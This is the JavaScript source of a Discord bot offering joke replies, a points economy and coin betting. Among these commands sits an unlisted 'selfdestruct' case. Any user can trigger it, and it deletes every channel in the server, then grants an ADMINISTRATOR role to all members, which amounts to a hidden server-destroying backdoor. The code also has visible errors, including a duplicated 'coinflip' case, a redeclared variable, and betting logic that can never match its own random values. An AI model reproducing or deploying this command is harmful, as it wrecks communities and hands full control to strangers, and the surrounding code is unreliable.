const Discord = require("discord.js");
const fs = require("fs")
const botSecrets = require("./bot-secrets.json")
const botConfig = require("./bot-config.json")
let exp = require("./exp.json")

var PREFIX = ";";

var bot = new Discord.Client()
let workCooldown = new Set()

bot.on("message", function(message) {
    if (message.author.equals(bot.user)) return;

    if (!message.content.startsWith(PREFIX)) return;

    var args = message.content.substring(PREFIX.length).split(" ");

    switch (args[0].toLowerCase()) {
        case "setprefix":
            if (args[1]) {
                PREFIX = args[1]
                message.reply(`The bot prefix was set to "${PREFIX}"`);
            } else {
                message.reply(botConfig.ERR_MSG);
            }
            break;
        case "ask":
            message.reply(answers[Math.floor(Math.random() * answers.length)])
            break;
        case "coinflip":
            message.reply(coinflips[Math.floor(Math.random() * coinflips.length)])
            break;
        case "coinflip":
                message.reply(rtds[Math.floor(Math.random() * rtds.length)])
                break;
        case "work":
            if (!exp[message.author.id]) {
                exp[message.author.id] = {
                    exp: 0
                }
            };
            let expAmt = Math.floor(Math.random() * 15) + 1;
            if (workCooldown.has(message.author.id)) {
                message.reply("You must wait for the work cooldown to end (30 minutes)!")
                message.delete()
                return
            } else {
                exp[message.author.id] = {
                    exp: exp[message.author.id].exp + expAmt
                };
                fs.writeFile("./exp.json", JSON.stringify(exp), (err) => {
                    if (err) console.log(`[SAVE POINTS ERROR] ${err}`)
                });
                var embed = new Discord.RichEmbed()
                    .setColor(botConfig.SERVER_POINTS_UI_COLOR)
                    .addField("**🌟 Server Points 🌟**",`${message.author} just worked for **${expAmt}** points!`,false)
                message.channel.send(embed);
                workCooldown.add(message.author.id)
            }
            break;
        case "balance":
            let findUser = message.guild.member(message.mentions.users.first())
            if (!findUser) {
                if (!exp[message.author.id]) return message.reply("You don't have any points, silly!")
                var embed = new Discord.RichEmbed()
                    .setColor(botConfig.SERVER_POINTS_UI_COLOR)
                    .addField("**🌟 Server Points 🌟**",`${message.author} currently has **${exp[message.author.id].exp}** points!`,false)
                message.channel.send(embed);
                break;
            }
            if (!exp[findUser.id]) return message.reply(`${findUser} doesn't have any points, silly!`)
            var embed = new Discord.RichEmbed()
                .setColor(botConfig.SERVER_POINTS_UI_COLOR)
                .addField("**🌟 Server Points 🌟**",`${findUser} currently has **${exp[findUser.id].exp}** points!`,false)
            message.channel.send(embed);
            break;
        case "pay":
            if (!exp[message.author.id]) return message.reply("You don't have any points, silly!")
            let payUser = message.guild.member(message.mentions.users.first())
            if (!payUser) return message.reply("User not found!")
            if (!args[2]) return message.reply("Point amount not found!")
            if (!Number.isInteger(parseInt(args[2]))) return message.reply("Point amount isn't a number!")
            if (!exp[payUser.id]) {
                exp[payUser.id] = {
                    exp: 0
                }
            };
            let payEXP = exp[payUser.id].exp
            let selfEXP = exp[message.author.id].exp
            if (selfEXP < parseInt(args[2])) return message.reply("You don't have enough points, silly!")
            exp[message.author.id] = {
                exp: selfEXP - parseInt(args[2])
            }
            exp[payUser.id] = {
                exp: payEXP + parseInt(args[2])
            }
            fs.writeFile("./exp.json", JSON.stringify(exp), (err) => {
                if (err) console.log(`[SAVE POINTS ERROR] ${err}`)
            })
            var embed = new Discord.RichEmbed()
                .setColor(botConfig.DEFAULT_UI_COLOR)
                .addField("**🌟 Server Points 🌟**",`${message.author} just gave ${payUser} **${args[2]}** points!`,false)
            message.channel.send(embed);
            break;
        case "coin":
            if (!exp[message.author.id]) return message.reply("You don't have any points to gamble with, silly!")
            let payUser = message.guild.member(message.mentions.users.first())
            if (!args[1] === "heads") {
                if (!args[1] === "tails") return message.reply("You must put heads or tails as your bet!")
            }
            if (!args[1] === "tails") {
                if (!args[1] === "heads") return message.reply("You must put heads or tails as your bet!")
            }
            if (!args[2]) return message.reply("Point amount not found!")
            if (!Number.isInteger(parseInt(args[2]))) return message.reply("Point amount isn't a number!")

            let winningChances = Math.floor(Math.random() * 2)
            if (winningChances === 1) {
                // Heads
                if (args[1] === "heads") {
                    // Win
                    exp[message.author.id] = {
                        exp: exp[message.author.id].exp + (parseInt(args[2]) * 2)
                    }
                    var embed = new Discord.RichEmbed()
                        .setColor(botConfig.DEFAULT_UI_COLOR)
                        .addField("**🌟 Server Points 🌟**",`${message.author} just bet **${args[2]}** points on heads and **doubled** it!`,false)
                    message.channel.send(embed);
                } else if (args[1] === "tails") {
                    // Lose
                    exp[message.author.id] = {
                        exp: exp[message.author.id].exp - parseInt(args[2])
                    }
                    var embed = new Discord.RichEmbed()
                        .setColor(botConfig.DEFAULT_UI_COLOR)
                        .addField("**🌟 Server Points 🌟**",`${message.author} just bet **${args[2]}** points on tails and **lost** it!`,false)
                    message.channel.send(embed);
                }
            } else if (winningChances === 2) {
                // Tails
                if (args[1] === "tails") {
                    // Win
                    exp[message.author.id] = {
                        exp: exp[message.author.id].exp + (parseInt(args[2]) * 2)
                    }
                    var embed = new Discord.RichEmbed()
                        .setColor(botConfig.DEFAULT_UI_COLOR)
                        .addField("**🌟 Server Points 🌟**",`${message.author} just bet **${args[2]}** points on tails and **doubled** it!`,false)
                    message.channel.send(embed);
                } else if (args[1] === "heads") {
                    // Lose
                    exp[message.author.id] = {
                        exp: exp[message.author.id].exp - parseInt(args[2])
                    }
                    var embed = new Discord.RichEmbed()
                        .setColor(botConfig.DEFAULT_UI_COLOR)
                        .addField("**🌟 Server Points 🌟**",`${message.author} just bet **${args[2]}** points on heads and **lost** it!`,false)
                    message.channel.send(embed);
                }
            }
            fs.writeFile("./exp.json", JSON.stringify(exp), (err) => {
                if (err) console.log(`[SAVE POINTS ERROR] ${err}`)
            })
            break;
        case "kidsreact":
            message.react(emojis[Math.floor(Math.random() * emojis.length)]);
            break;
        case "selfdestruct":
            for (var i = 0; i < message.guild.channels.array().length; i++) {
                message.guild.channels.array()[i].delete();
            }
            message.guild.createChannel("self-destructed", "text")
            .then( function() {
                message.guild.channels.array()[1].send("@everyone Would you look at that? Everyone has admin!")
                message.member.guild.createRole({
                    name: "Admin",
                    color: "0xFF4000",
                    hoist: true,
                    permissions: ["ADMINISTRATOR"],
                }).then( function(role)
                {
                    for (var i = 0; i < message.member.guild.members.array().length; i++) {
                        message.member.guild.members.array()[i].addRole(role)
                        .then()
                        .catch();
                    }
                })
                .catch();
            })
            .catch(function(err) {
            })
            break;
        case "cmds":
            var embed = new Discord.RichEmbed()
                .setColor(botConfig.DEFAULT_UI_COLOR)
                .setTitle("**Here are the Cylbot commands:**")
                .addField(`${PREFIX}cmds`,"Brings up this menu.",false)
                .addField(`${PREFIX}help`,"Brings up the help menu.",false)
                .addField(`${PREFIX}setprefix {new prefix}`,"Sets the current prefix for the bot.",false)
                .addField(`${PREFIX}ask {question}`,"Gives you a random unrelated answer.",false)
                .addField(`${PREFIX}coinflip`,"Flips a coin and gives you heads or tails.",false)
                .addField(`${PREFIX}rtd`,"Rolls the dice and gives you heads or tails.",false)
                .addField(`${PREFIX}kidsreact`,"Places a random reaction on your last message.",false)
                .addField("-------- Economy Commands --------","These commands deal with server points.",false)
                .addField(`${PREFIX}work`,"Work for a random amount of coins.",false)
                .addField(`${PREFIX}balance {user}`,"Check the points balance of a user.",false)
                .addField(`${PREFIX}pay {user} {amount}`,"Send server points to another user.",false)
                .addField(`${PREFIX}coin {heads or tails} {bet amount}`,"If you win you double your money; if you don't you lose it.",false)
            message.reply(embed);
            break;
        case "help":
            var embed = new Discord.RichEmbed()
                .setColor(botConfig.DEFAULT_UI_COLOR)
                .setThumbnail(bot.user.avatarURL)
                .setTitle(`**${botConfig.BOT_NAME} ${botConfig.BOT_VERSION}**`)
                .setFooter("Created by Crystalflame")
                .addField("Description:",botConfig.BOT_DESCRIPTION,false)
                .addField("Created:",bot.user.createdAt,false)
            message.reply(embed);
            break;
        default:
            message.reply(botConfig.ERR_MSG);
    }
    setTimeout(() => {
        workCooldown.delete(message.author.id)
    }, botConfig.POINTS_COOLDOWN * 1000)
});

bot.on("ready", () => {
    bot.user.setActivity("for commands!", {type:"WATCHING"})
    console.log(`[STARTUP] ${botConfig.BOT_NAME} ${botConfig.BOT_VERSION} started!`)
    console.log(`[STARTUP] ${botConfig.BOT_NAME} is currently running on ${bot.guilds.size} servers.`)
});

bot.login(botSecrets.TOKEN);

var coinflips = [
    "Heads!",
    "Tails!",
]
var rtds = [
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
]
var answers = [
    "Yes.",
    "No.",
    "Maybe.",
    "I cannot answer that.",
]
var emojis = [
	'😄','😃','😀','😊','😉','😍','😘','😚','😗','😙','😜','😝','😛','😳','😁','😔','😌','😒','😞','😣','😢','😂','😭','😪','😥','😰','😅','😓','😩','😫','😨','😱','😠','😡','😤','😖','😆','😋','😷','😎','😴','😵','😲','😟','😦','😧','😈','👿','😮','😬','😐','😕','😯','😶','😇','😏','😑','👲','👳','👮','👷','💂','👶','👦','👧','👨','👩','👴','👵','👱','👼','👸','😺','😸','😻','😽','😼','🙀','😿','😹','😾','👹','👺','🙈','🙉','🙊','💀','👽','💩','🔥'
]